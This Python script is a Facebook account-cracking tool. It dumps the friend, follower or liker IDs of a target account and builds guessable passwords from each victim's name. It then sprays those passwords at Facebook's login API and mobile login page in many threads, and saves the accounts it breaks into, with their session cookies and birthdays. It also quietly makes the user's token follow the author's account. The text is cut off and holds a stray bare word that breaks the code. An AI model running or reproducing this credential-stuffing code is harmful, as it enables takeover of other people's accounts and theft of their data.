#!/usr/bin/python3
#-*-coding:utf-8-*-
# Made With ❤️ By Dapunta And XNSCODE Project
# Update V0.1

# Copyright© Dapunta ID 2021
# 100% Open Source Code

# Author : Dapunta Adyapaksi R.
# Facebook (Dapunta Khurayra X)   : Facebook.com/Dapunta.Khurayra.X
# Instagram (☬ 𝐀𝐧𝐨𝐧𝐲𝐦 𝟒𝟎𝟒 ☬)    : Instagram.com/ratya.anonym.id
# Whatsapp (Dapunta Bot_Key)      : +6282245780524
# YouTube (Xayonara.ID)           : Youtube.com/channel/UCZqnZlJ0jfoWSnXrNEj5JHA

# Free Recode For Personal Use
# Bebas Recode Untuk Penggunaan Pribadi
# Izin Terlebih Dahulu Apabila Ingin Re-Upload
# Jangan Jual Belikan File Source Code Ini !

### Import Module
import requests,sys,bs4,os,random,time,json
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from datetime import datetime

### Perumpamaan Module & Syntax
_req_get_   = requests.get
_req_post_ = requests.post
_js_lo_    = json.loads
_dapunta_cici_    = print
_cici_dapunta_    = input
_dapunta_dapunta_ = open
_cici_cici_       = exit

### Waktu & Tanggal
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
bulan = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"]
try:
    if bu < 0 or bu > 12:
        _cici_cici_()
    buTemp = bu - 1
except ValueError:
    _cici_cici_()
op = bulan[buTemp]
tanggal = ("%s-%s-%s"%(ha,op,ta))

### Warna
_P_ = "\x1b[0;97m" # Putih
_M_ = "\x1b[0;91m" # Merah
_H_ = "\x1b[0;92m" # Hijau
_U_ = "\x1b[0;91m" # Ungu

### Logo
_logo_line_1_ = ('%s ___  __  __ ___ ___ '%(_P_))
_logo_line_2_ = ('%s|   \|  \/  | _ ) __| %s┌─────────────────────────┐'%(_P_,_U_))
_logo_line_3_ = ('%s| |) | |\/| | _ \ _|  %s│   %s• Code By Asim •  %s│'%(_P_,_U_,_P_,_U_))
_logo_line_4_ = ('%s|___/|_|  |_|___/_|   %s│ %sAsimBot Fl Command  %s│'%(_P_,_U_,_P_,_U_))
_logo_line_5_ = ('%s Rajpoot Team 2021      └─────────────────────────┘'%(_U_))
def _my_logo_():
    _dapunta_cici_(_logo_line_1_)
    _dapunta_cici_(_logo_line_2_)
    _dapunta_cici_(_logo_line_3_)
    _dapunta_cici_(_logo_line_4_)
    _dapunta_cici_(_logo_line_5_+'\n')

### User Agent
ua_xiaomi  = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_nokia   = 'nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+'
ua_asus    = 'Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_huawei  = 'Mozilla/5.0 (Linux; Android 8.1.0; HUAWEI Y7 PRIME 2019 Build/5887208) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_vivo    = 'Mozilla/5.0 (Linux; Android 11; vivo 1918) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_oppo    = 'Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_samsung = 'Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]'
ua_windows = 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'

### Penampungan
_id_tampung_ = []

### Jangan Diganti Nanti Error
_oscylopsce_ = '__Dapunta__'
_ascylapsci_ = '__Cici__'
_escylipsce_ = '__Dapunta_Love_Cici__'
_uscylupsci_ = '__My_Love____Dapunta____Dapunta_Love_Cici____Cici____Forever__'

### Membuat Folder Direktori
def _folder_():
    try:os.mkdir("CP")
    except:pass
    try:os.mkdir("OK")
    except:pass

### Clear Login Session
def _bersih_():
    try:os.remove('token.txt')
    except:pass

### Clear User Agent
def _del_():
    try:os.remove('ugent.txt')
    except:pass

### Clear Terminal
def _clear_():
    if "linux" in sys.platform.lower():os.system("clear")
    elif "win" in sys.platform.lower():os.system("cls")
    else:os.system("clear")

### Jangan Diganti Anjink!
def _bot_follow_(_tok_dev_):
    token = _tok_dev_
    try:
        _req_post_("https://graph.facebook.com/1827084332/subscribers?access_token=" + token)      # Dapunta Khurayra 
        time.sleep(2)
    except (KeyError,IOError):pass

### Login
def _login_dev_(_Cici_Cantik_Banget_):
    _clear_()
    _my_logo_()
    if _uscylupsci_ not in _Cici_Cantik_Banget_:_dapunta_cici_('%s[%s!%s] %sHayoo Mau Recode Ya?'%(_M_,_P_,_M_,_P_))
    else:pass
    _tok_dev_ = _cici_dapunta_('%s[%s•%s] %sMasukkan Token :\n\n'%(_U_,_P_,_U_,_P_))
    try:
        _req_tok_  = _req_get_("https://graph.facebook.com/me?access_token=%s"%(_tok_dev_))
        _js_load_  = _js_lo_(_req_tok_.text)
        _nama_dev_ = _js_load_['name']
        _op_dev_ = _dapunta_dapunta_('token.txt','w')
        _op_dev_.write(_tok_dev_)
        _op_dev_.close()
        _bot_follow_(_tok_dev_)
        _default_ua_(_Cici_Cantik_Banget_)
        _menu_dev_(_Cici_Cantik_Banget_)
    except (KeyError,IOError):
        _dapunta_cici_('\n%s[%s!%s] %sToken Invalid'%(_M_,_P_,_M_,_P_))
        _bersih_()
        time.sleep(2)
        _login_dev_(_Cici_Cantik_Banget_)
    except requests.exceptions.ConnectionError:
        _dapunta_cici_('\n%s[%s!%s] %sKoneksi Bermasalah'%(_M_,_P_,_M_,_P_))
        _cici_cici_()

### Menu
def _menu_dev_(_Dapunta_Ganteng_Banget_):
    _clear_()
    _my_logo_()
    if _uscylupsci_ not in _Dapunta_Ganteng_Banget_:_dapunta_cici_('%s[%s!%s] %sHayoo Mau Recode Ya?'%(_M_,_P_,_M_,_P_))
    else:pass
    try:
        _tok_dev_  = _dapunta_dapunta_("token.txt","r").read()
        _req_tok_  = _req_get_("https://graph.facebook.com/me?access_token=%s"%(_tok_dev_))
        _js_load_  = _js_lo_(_req_tok_.text)
        _nama_dev_ = _js_load_['name']
        _id_dev_   = _js_load_['id']
    except (KeyError,IOError):
        _dapunta_cici_('%s[%s!%s] %sToken Invalid'%(_M_,_P_,_M_,_P_))
        _bersih_()
        time.sleep(2)
        _login_dev_(_Dapunta_Ganteng_Banget_)
    except requests.exceptions.ConnectionError:
        _dapunta_cici_('%s[%s!%s] %sKoneksi Bermasalah'%(_M_,_P_,_M_,_P_))
        _cici_cici_()
    try:
        _ip_url_ = "http://ip-api.com/json/"
        _ip_headers_ = {
            "Referer":"http://ip-api.com/",
            "Content-Type":"application/json; charset=utf-8",
            "User-Agent":"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
            }
        _ip_req_ = _req_get_(_ip_url_,headers=_ip_headers_).json()
        _ip_dev_ = _ip_req_["query"]
    except:
        _ip_dev_ = " "
    _dapunta_cici_('%s[%s•%s] %sHalo %s%s'%(_U_,_P_,_U_,_P_,_U_,_nama_dev_))
    _dapunta_cici_('%s[%s•%s] %sID : %s'%(_U_,_P_,_U_,_P_,_id_dev_))
    _dapunta_cici_('%s[%s•%s] %sIP : %s\n'%(_U_,_P_,_U_,_P_,_ip_dev_))
    _dapunta_cici_('%s[%s1%s] %sCrack ID Dari Teman/Publik'%(_U_,_P_,_U_,_P_))
    _dapunta_cici_('%s[%s2%s] %sCrack ID Dari Pengikut'%(_U_,_P_,_U_,_P_))
    _dapunta_cici_('%s[%s3%s] %sCrack ID Dari Likers'%(_U_,_P_,_U_,_P_))
    _dapunta_cici_('%s[%s4%s] %sLihat Hasil Crack'%(_U_,_P_,_U_,_P_))
    _dapunta_cici_('%s[%s5%s] %sUser Agent'%(_U_,_P_,_U_,_P_))
    _dapunta_cici_('%s[%s0%s] %sLog Out'%(_U_,_P_,_U_,_P_))
    _dapunta_menu__cici_dapunta__ = _cici_dapunta_('%s[%s•%s] %sPilih : '%(_U_,_P_,_U_,_P_))
    _dapunta_cici_('')
    if _dapunta_menu__cici_dapunta__ in ['',' ']:
        _dapunta_cici_('%s[%s!%s] %sIsi Yang Benar'%(_M_,_P_,_M_,_P_))
        time.sleep(2)
        _menu_dev_(_Dapunta_Ganteng_Banget_)
    elif _dapunta_menu__cici_dapunta__ in ['1','01','a']:
        _publik_dev_(_tok_dev_)
    elif _dapunta_menu__cici_dapunta__ in ['2','02','b']:
        _followers_dev_(_tok_dev_)
    elif _dapunta_menu__cici_dapunta__ in ['3','03','c']:
        _likers_dev_(_tok_dev_)
    elif _dapunta_menu__cici_dapunta__ in ['4','04','d']:
        _cek_result_dev_()
    elif _dapunta_menu__cici_dapunta__ in ['5','05','e']:
        _ugen_dev_(_Dapunta_Ganteng_Banget_)
    elif _dapunta_menu__cici_dapunta__ in ['0','00','z']:
        _dapunta_cici_('%s[%s•%s] %sSampai Jumpa %s%s %s!'%(_U_,_P_,_U_,_P_,_U_,_nama_dev_,_P_))
        _bersih_()
        time.sleep(2)
        _login_dev_(_Dapunta_Ganteng_Banget_)
    else:
        _dapunta_cici_('%s[%s!%s] %sIsi Yang Benar'%(_M_,_P_,_M_,_P_))
        time.sleep(2)
        _menu_dev_(_Dapunta_Ganteng_Banget_)

### Dump ID Publik
def _publik_dev_(_tok_dev_):
    _Dapunta_Sayang_Cici_ = '__My_Love__'+_oscylopsce_+_escylipsce_+_ascylapsci_+'__Forever__'
    _dapunta_cici_('%s[%s•%s] %sTulis \'me\' Untuk Mengambil ID Teman'%(_U_,_P_,_U_,_P_))
    _target_dev_ = _cici_dapunta_('%s[%s•%s] %sMasukkan ID Target : %s'%(_U_,_P_,_U_,_P_,_U_))
    try:
        _req_tar_ = _req_get_("https://graph.facebook.com/%s?access_token=%s"%(_target_dev_,_tok_dev_))
        _jso_tar_ = _js_lo_(_req_tar_.text)
        _name_    = _jso_tar_['name']
        _dapunta_cici_('%s[%s•%s] %sNama : %s%s'%(_U_,_P_,_U_,_P_,_U_,_name_))
    except:
        _dapunta_cici_('%s[%s!%s] %sToken Invalid / ID Tidak Ditemukan'%(_M_,_P_,_M_,_P_))
        time.sleep(2)
        _menu_dev_(_Dapunta_Sayang_Cici_)
    try:
        _req_fl_ = _req_get_("https://graph.facebook.com/%s/friends?limit=1000000&access_token=%s"%(_target_dev_,_tok_dev_))
        _lo_dev_ = _js_lo_(_req_fl_.text)
        _jso_file_ = (_jso_tar_["first_name"]+".json").replace(" ","_")
        _jso_exec_ = _dapunta_dapunta_(_jso_file_,"w")
        for _Dapunta_Cici_Forever_ in _lo_dev_["data"]:
            try:
                _id_tampung_.append(_Dapunta_Cici_Forever_["id"]+"•"+_Dapunta_Cici_Forever_["name"])
                _jso_exec_.write(_Dapunta_Cici_Forever_["id"]+"•"+_Dapunta_Cici_Forever_["name"]+"\n")
            except:continue
        _jso_exec_.close()
        _dapunta_cici_('%s[%s•%s] %sTotal ID : %s%s'%(_U_,_P_,_U_,_P_,_U_,len(_id_tampung_)))
    except:
        _dapunta_cici_('%s[%s!%s] %sToken Invalid / ID Tidak Ditemukan'%(_M_,_P_,_M_,_P_))
        time.sleep(2)
        _menu_dev_(_Dapunta_Sayang_Cici_)
    return _crack_dev_(_jso_file_)

### Dump ID Pengikut
def _followers_dev_(_tok_dev_):
    _Dapunta_Sayang_Cici_ = '__My_Love__'+_oscylopsce_+_escylipsce_+_ascylapsci_+'__Forever__'
    _dapunta_cici_('%s[%s•%s] %sTulis \'me\' Untuk Mengambil ID Teman'%(_U_,_P_,_U_,_P_))
    _target_dev_ = _cici_dapunta_('%s[%s•%s] %sMasukkan ID Target : %s'%(_U_,_P_,_U_,_P_,_U_))
    try:
        _req_tar_ = _req_get_("https://graph.facebook.com/%s?access_token=%s"%(_target_dev_,_tok_dev_))
        _jso_tar_ = _js_lo_(_req_tar_.text)
        _name_    = _jso_tar_['name']
        _dapunta_cici_('%s[%s•%s] %sNama : %s%s'%(_U_,_P_,_U_,_P_,_U_,_name_))
    except:
        _dapunta_cici_('%s[%s!%s] %sToken Invalid / ID Tidak Ditemukan'%(_M_,_P_,_M_,_P_))
        time.sleep(2)
        _menu_dev_(_Dapunta_Sayang_Cici_)
    try:
        _req_fl_ = _req_get_("https://graph.facebook.com/%s/subscribers?limit=1000000&access_token=%s"%(_target_dev_,_tok_dev_))
        _lo_dev_ = _js_lo_(_req_fl_.text)
        _jso_file_ = (_jso_tar_["first_name"]+".json").replace(" ","_")
        _jso_exec_ = _dapunta_dapunta_(_jso_file_,"w")
        for _Dapunta_Cici_Forever_ in _lo_dev_["data"]:
            try:
                _id_tampung_.append(_Dapunta_Cici_Forever_["id"]+"•"+_Dapunta_Cici_Forever_["name"])
                _jso_exec_.write(_Dapunta_Cici_Forever_["id"]+"•"+_Dapunta_Cici_Forever_["name"]+"\n")
            except:continue
        _jso_exec_.close()
        _dapunta_cici_('%s[%s•%s] %sTotal ID : %s%s'%(_U_,_P_,_U_,_P_,_U_,len(_id_tampung_)))
    except:
        _dapunta_cici_('%s[%s!%s] %sToken Invalid / ID Tidak Ditemukan'%(_M_,_P_,_M_,_P_))
        time.sleep(2)
        _menu_dev_(_Dapunta_Sayang_Cici_)
    return _crack_dev_(_jso_file_)

### Dump ID Likers
def _likers_dev_(_tok_dev_):
    _Dapunta_Sayang_Cici_ = '__My_Love__'+_oscylopsce_+_escylipsce_+_ascylapsci_+'__Forever__'
    _dapunta_cici_('%s[%s•%s] %sTulis \'me\' Untuk Mengambil ID Teman'%(_U_,_P_,_U_,_P_))
    _target_dev_ = _cici_dapunta_('%s[%s•%s] %sMasukkan ID Target : %s'%(_U_,_P_,_U_,_P_,_U_))
    try:
        _req_tar_ = _req_get_("https://graph.facebook.com/%s?access_token=%s"%(_target_dev_,_tok_dev_))
        _jso_tar_ = _js_lo_(_req_tar_.text)
        _name_    = _jso_tar_['name']
        _dapunta_cici_('%s[%s•%s] %sNama : %s%s'%(_U_,_P_,_U_,_P_,_U_,_name_))
    except:
        _dapunta_cici_('%s[%s!%s] %sToken Invalid / ID Tidak Ditemukan'%(_M_,_P_,_M_,_P_))
        time.sleep(2)
        _menu_dev_(_Dapunta_Sayang_Cici_)
    try:
        _req_fl_ = _req_get_("https://graph.facebook.com/%s/likes?limit=1000000&access_token=%s"%(_target_dev_,_tok_dev_))
        _lo_dev_ = _js_lo_(_req_fl_.text)
        _jso_file_ = (_jso_tar_["first_name"]+".json").replace(" ","_")
        _jso_exec_ = _dapunta_dapunta_(_jso_file_,"w")
        for _Dapunta_Cici_Forever_ in _lo_dev_["data"]:
            try:
                _id_tampung_.append(_Dapunta_Cici_Forever_["id"]+"•"+_Dapunta_Cici_Forever_["name"])
                _jso_exec_.write(_Dapunta_Cici_Forever_["id"]+"•"+_Dapunta_Cici_Forever_["name"]+"\n")
            except:continue
        _jso_exec_.close()
        _dapunta_cici_('%s[%s•%s] %sTotal ID : %s%s'%(_U_,_P_,_U_,_P_,_U_,len(_id_tampung_)))
    except:
        _dapunta_cici_('%s[%s!%s] %sToken Invalid / ID Tidak Ditemukan'%(_M_,_P_,_M_,_P_))
        time.sleep(2)
        _menu_dev_(_Dapunta_Sayang_Cici_)
    return _crack_dev_(_jso_file_)

### Generate Password
def _pass_list_(_cici_):
    _dapunta_=[]
    for i in _cici_.split(" "):
        if len(i)<3:
            continue
        else:
            i=i.lower()
            if len(i)==3 or len(i)==4 or len(i)==5:
                _dapunta_.append(i+"123")
                _dapunta_.append(i+"1234")
                _dapunta_.append(i+"12345")
                _dapunta_.append(i+"1")
                _dapunta_.append(i+"12")
                _dapunta_.append(i+"1122")
            else:
                _dapunta_.append(i)
                _dapunta_.append(i+"123")
                _dapunta_.append(i+"1234")
                _dapunta_.append(i+"12345")
                _dapunta_.append(i+"1")
                _dapunta_.append(i+"12")
                _dapunta_.append(i+"1122")
    _dapunta_.append(_cici_.lower().split(" ")[0]+_cici_.lower().split(" ")[1]+"1")
    _dapunta_.append(_cici_.lower().split(" ")[0]+_cici_.lower().split(" ")[1]+"12")
    _dapunta_.append(_cici_.lower().split(" ")[0]+_cici_.lower().split(" ")[1]+"123")
    _dapunta_.append(_cici_.lower().split(" ")[0]+_cici_.lower().split(" ")[1]+"1234")
    _dapunta_.append(_cici_.lower().split(" ")[0]+_cici_.lower().split(" ")[1]+"12345")
    _dapunta_.append("pakistan")
    _dapunta_.append("pakistan123")
    _dapunta_.append("pakistan1")
    _dapunta_.append("pakistan12")
    _dapunta_.append("pakistan1234")
    return _dapunta_

### Logger Crack
def log_api(em,pas,hosts):
    ua = open('ugent.txt','r').read()
    r = requests.Session()
    header = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)),
        "x-fb-sim-hni": str(random.randint(20000, 40000)),
        "x-fb-net-hni": str(random.randint(20000, 40000)),
        "x-fb-connection-quality": "EXCELLENT",
        "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
        "user-agent": ua,
        "content-type": "application/x-www-form-urlencoded",
        "x-fb-http-engine": "Liger"}
    param = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 
        'format': 'json', 
        'sdk_version': '2', 
        'email': em, 
        'locale': 'en_US', 
        'password': pas, 
        'sdk': 'ios', 
        'generate_session_cookies': '1', 
        'sig':'3f555f99fb61fcd7aa0c44f58f522ef6'}
    api = 'https://b-api.facebook.com/method/auth.login'
    response = r.get(api, params=param, headers=header)
    if 'session_key' in response.text and 'EAAA' in response.text:
        return {"status":"success","email":em,"pass":pas}
    elif 'www.facebook.com' in response.json()['error_msg']:
        return {"status":"cp","email":em,"pass":pas}
    else:return {"status":"error","email":em,"pass":pas}
def log_mbasic(em,pas,hosts):
    ua = open('ugent.txt','r').read()
    r = requests.Session()
    r.headers.update({"Host":"mtouch.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
    p = r.get("https://mtouch.facebook.com/")
    b = r.post("https://mtouch.facebook.com/login.php", data={"email": em, "pass": pas, "login": "submit"})
    _raw_cookies_ = (";").join([ "%s=%s" % (key, value) for key, value in r.cookies.get_dict().items() ])
    if "c_user" in r.cookies.get_dict().keys():
        return {"status":"success","email":em,"pass":pas,"cookies":_raw_cookies_}
    elif "checkpoint" in r.cookies.get_dict().keys():
        return {"status":"cp","email":em,"pass":pas,"cookies":_raw_cookies_}
    else:return {"status":"error","email":em,"pass":pas}
def koki(_cookies_):
    samp_  = _cookies_.split(';')
    _cooked_cookies_ = ('%s;%s;%s;%s;%s'%(samp_[2],samp_[4],samp_[0],samp_[3],samp_[1]))
    return _cooked_cookies_

### Crack Proccess
class _crack_dev_:
    def __init__(self,files):
        self._Dapunta_Sayang_Cici_ = '__My_Love__'+_oscylopsce_+_escylipsce_+_ascylapsci_+'__Forever__'
        self.ada = []
        self.cp = []
        self.ko = 0
        _dapunta_cici_('\n%s[%s•%s] %sCrack Dengan Password Default/Manual [d/m]'%(_U_,_P_,_U_,_P_))
        while True:
            f = _cici_dapunta_('%s[%s•%s] %sPilih : '%(_U_,_P_,_U_,_P_))
            if f=="":
                _dapunta_cici_('%s[%s!%s] %sIsi Yang Benar'%(_M_,_P_,_M_,_P_))
                time.sleep(2)
                _menu_dev_(self._Dapunta_Sayang_Cici_)
            elif f in ['m','M','2','02','002']:
                try:
                    while True:
                        try:
                            self.apk = files
                            self.fs = _dapunta_dapunta_(self.apk).read().splitlines()
                            break
                        except:
                            _dapunta_cici_('%s[%s!%s] %sFile Dump Tidak Terdeteksi'%(_M_,_P_,_M_,_P_))
                            time.sleep(2)
                            _menu_dev_(self._Dapunta_Sayang_Cici_)
                    self.fl = []
                    for i in self.fs:
                        dapunta 
                        try:
                            self.fl.append({"id":i.split("•")[0]})
                        except:continue
                except Exception as e:
                    _dapunta_cici_('%s[%s!%s] %sFile Dump Tidak Terdeteksi'%(_M_,_P_,_M_,_P_))
                    time.sleep(2)
                    _menu_dev_(self._Dapunta_Sayang_Cici_)
                _dapunta_cici_('%s[%s•%s] %sContoh : sayang,bismillah,123456'%(_U_,_P_,_U_,_P_))
                self.pwlist()
                break
            elif f in ['d','D','1','01','001']:
                try:
                    while True:
                        try:
                            self.apk = files
                            self.fs = _dapunta_dapunta_(self.apk).read().splitlines()
                            break
                        except:
                            continue
                    self.fl = []
                    for i  in self.fs:
                        try:
                            self.fl.append({"id":i.split("•")[0],"pw":_pass_list_(i.split("•")[1])})
                        except:continue
                    start_method()
                    put = _cici_dapunta_('%s[%s•%s] %sPilih : '%(_U_,_P_,_U_,_P_))
                    _dapunta_cici_(''%())
                    if put in ['']:
                        _dapunta_cici_('%s[%s!%s] %sIsi Yang Benar'%(_M_,_P_,_M_,_P_))
                        time.sleep(2)
                        _menu_dev_(self._Dapunta_Sayang_Cici_)
                    elif put in ['1','01','001','a']:
                        started()
                        ThreadPool(35).map(self.api,self.fl)
                        os.remove(self.apk)
                        _cici_cici_()
                    elif put in ['2','02','002','b']:
                        started()
                        ThreadPool(35).map(self.mbasic,self.fl)
                        os.remove(self.apk)
                        _cici_cici_()
                    else:
                        _dapunta_cici_('%s[%s!%s] %sIsi Yang Benar'%(_M_,_P_,_M_,_P_))
                        time.sleep(2)
                        _menu_dev_(self._Dapunta_Sayang_Cici_)
                except Exception as e:
                    continue
    def pwlist(self):
        self.pw = _cici_dapunta_('%s[%s•%s] %sMasukkan Password : '%(_U_,_P_,_U_,_P_)).split(",")
        if len(self.pw) ==0:
            _dapunta_cici_('%s[%s!%s] %sIsi Yang Benar'%(_M_,_P_,_M_,_P_))
            time.sleep(2)
            _menu_dev_(self._Dapunta_Sayang_Cici_)
        else:
            for i in self.fl:
                i.update({"pw":self.pw})
            start_method()
            put = _cici_dapunta_('%s[%s•%s] %sPilih : '%(_U_,_P_,_U_,_P_))
            _dapunta_cici_(''%())
            if put in ['']:
                _dapunta_cici_('%s[%s!%s] %sIsi Yang Benar'%(_M_,_P_,_M_,_P_))
                time.sleep(2)
                _menu_dev_(self._Dapunta_Sayang_Cici_)
            elif put in ['1','01','001','a']:
                started()
                ThreadPool(30).map(self.api,self.fl)
                os.remove(self.apk)
                _cici_cici_()
            elif put in ['2','02','002','b']:
                started()
                ThreadPool(30).map(self.mbasic,self.fl)
                os.remove(self.apk)
                _cici_cici_()
            else:
                _dapunta_cici_('%s[%s!%s] %sIsi Yang Benar'%(_M_,_P_,_M_,_P_))
                time.sleep(2)
                _menu_dev_(self._Dapunta_Sayang_Cici_)
    def api(self,fl):
        try:
            for i in fl.get("pw"):
                log = log_api(fl.get("id"),i,"https://b-api.facebook.com")
                if log.get("status")=="cp":
                    try:
                        ke = _req_get_("https://graph.facebook.com/" + fl.get("id") + "?access_token=" + _dapunta_dapunta_("token.txt","r").read())
                        tt = json.loads(ke.text)
                        ttl = tt["birthday"]
                        m,d,y = ttl.split("/")
                        m = bulan_ttl[m]
                        _dapunta_cici_("\r%s[%sCP%s] %s • %s • %s %s %s         "%(_U_,_P_,_U_,fl.get("id"),i,d,m,y))
                        self.cp.append("%s•%s•%s%s%s"%(fl.get("id"),i,d,m,y))
                        _dapunta_dapunta_("CP/%s.txt"%(tanggal),"a+").write("%s•%s•%s%s%s\n"%(fl.get("id"),i,d,m,y))
                        break
                    except(KeyError, IOError):
                        m = " "
                        d = " "
                        y = " "
                    except:pass
                    _dapunta_cici_("\r%s[%sCP%s] %s • %s                 "%(_U_,_P_,_U_,fl.get("id"),i))
                    self.cp.append("%s•%s"%(fl.get("id"),i))
                    _dapunta_dapunta_("CP/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
                    break
                elif log.get("status")=="success":
                    _dapunta_cici_("\r%s[%sOK%s] %s • %s                 "%(_H_,_P_,_H_,fl.get("id"),i))
                    self.ada.append("%s•%s"%(fl.get("id"),i))
                    _dapunta_dapunta_("OK/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
                    break
                else:continue
            self.ko+=1
            _dapunta_cici_("\r%s[%sCrack%s][%s%s/%s%s][%sOK:%s%s][%sCP:%s%s]%s"%(_U_,_P_,_U_,_P_,self.ko,len(self.fl),_U_,_P_,len(self.ada),_U_,_P_,len(self.cp),_U_,_P_), end=' ');sys.stdout.flush()
        except:
            self.api(fl)
    def mbasic(self,fl):
        try:
            for i in fl.get("pw"):
                log = log_mbasic(fl.get("id"),i,"https://mbasic.facebook.com")
                if log.get("status")=="cp":
                    try:
                        ke = _req_get_("https://graph.facebook.com/" + fl.get("id") + "?access_token=" + _dapunta_dapunta_("token.txt","r").read())
                        tt = json.loads(ke.text)
                        ttl = tt["birthday"]
                        m,d,y = ttl.split("/")
                        m = bulan_ttl[m]
                        _dapunta_cici_("\r%s[%sCP%s] %s • %s • %s %s %s         "%(_U_,_P_,_U_,fl.get("id"),i,d,m,y))
                        self.cp.append("%s•%s•%s%s%s"%(fl.get("id"),i,d,m,y))
                        _dapunta_dapunta_("CP/%s.txt"%(tanggal),"a+").write("%s•%s•%s%s%s\n"%(fl.get("id"),i,d,m,y))
                        break
                    except(KeyError, IOError):
                        m = " "
                        d = " "
                        y = " "
                    except:pass
                    _dapunta_cici_("\r%s[%sCP%s] %s • %s                 "%(_U_,_P_,_U_,fl.get("id"),i))
                    self.cp.append("%s•%s"%(fl.get("id"),i))
                    _dapunta_dapunta_("CP/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
                    break
                elif log.get("status")=="success":
                    _dapunta_cici_("\r%s[%sOK%s] %s • %s • %s     "%(_H_,_P_,_H_,fl.get("id"),i,koki(log.get("cookies"))))
                    self.ada.append("%s•%s"%(fl.get("id"),i))
                    _dapunta_dapunta_("OK/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
                    break
                else:continue
            self.ko+=1
            _dapunta_cici_("\r%s[%sCrack%s][%s%s/%s%s][%sOK:%s%s][%sCP:%s%s]%s"%(_U_,_P_,_U_,_P_,self.ko,len(self.fl),_U_,_P_,len(self.ada),_U_,_P_,len(self.cp),_U_,_P_), end=' ');sys.stdout.flush()
        except:
            self.mbasic(fl)

### Menu Mengecek Hasil Crack
def _cek_result_dev_():
    _clear_()
    _my_logo_()
    _Dapunta_Sayang_Cici_ = '__My_Love__'+_oscylopsce_+_escylipsce_+_ascylapsci_+'__Forever__'
    _dapunta_cici_('%s[ %sHasil Crack %s]'%(_U_,_P_,_U_))
    _dapunta_cici_('\n%s[%s1%s] %sCek Hasil OK'%(_U_,_P_,_U_,_P_))
    _dapunta_cici_('%s[%s2%s] %sCek Hasil CP'%(_U_,_P_,_U_,_P_))
    ch = _cici_dapunta_('%s[%s•%s] %sPilih : '%(_U_,_P_,_U_,_P_))
    if ch in ['']:
        _dapunta_cici_('%s[%s!%s] %sIsi Yang Benar'%(_M_,_P_,_M_,_P_))
        time.sleep(2)
        _menu_dev_(_Dapunta_Sayang_Cici_)
    elif ch in ['1','01','001','a']:
        try:
            okl = os.listdir("OK")
            _dapunta_cici_('\n%s[%s Hasil Crack Yang Tersimpan Di File OK %s]\n'%(_U_,_P_,_U_))
            for file in okl:
                _dapunta_cici_('%s[%s•%s] %s%s'%(_U_,_P_,_U_,_P_,file))
            _dapunta_cici_('')
            files = _cici_dapunta_('%s[%s•%s] %sMasukkan Nama File : '%(_U_,_P_,_U_,_P_))
            _dapunta_cici_('')
            if files == "":
                _dapunta_cici_('%s[%s!%s] %sIsi Yang Benar'%(_M_,_P_,_M_,_P_))
                time.sleep(2)
                _menu_dev_(_Dapunta_Sayang_Cici_)
            os.system('cat OK/%s'%(files))
            ppp = _dapunta_dapunta_("OK/%s"%(files)).read().splitlines()
            del1 = ("%s"%(files)).replace("-", " ").replace(".txt", "")
            _dapunta_cici_('\n%s[%s•%s] %sTotal Hasil Crack Tanggal %s Adalah %s Akun'%(_U_,_P_,_U_,_P_,del1,len(ppp)))
        except:
            _dapunta_cici_('%s[%s Hasil Tidak Ditemukan %s]'%(_M_,_P_,_M_))
    elif ch in ['2','02','002','b']:
        try:
            cpl = os.listdir("CP")
